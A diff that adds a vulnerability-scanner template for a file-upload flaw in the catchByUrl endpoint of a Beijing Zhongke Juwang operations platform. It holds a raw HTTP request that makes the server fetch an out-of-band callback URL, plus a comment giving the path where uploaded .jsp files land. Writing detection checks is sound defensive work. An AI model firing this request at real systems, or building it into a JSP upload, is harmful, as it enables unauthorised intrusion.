@@ -1,0 +1,27 @@
+id: zkjw-catchByUrl-upload
+
+info:
+  name: 北京中科聚网一体化运营平台catchByUrl存在文件上传漏洞
+  author: apple
+  severity: critical
+  description: 北京中科聚网一体化运营平台catchByUrl存在文件上传漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91%E4%B8%80%E4%BD%93%E5%8C%96%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0catchByUrl%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        GET /resources/files/ue/catchByUrl?url=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        Connection: close
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+#文件路径http://ip/files/headimg/.jsp
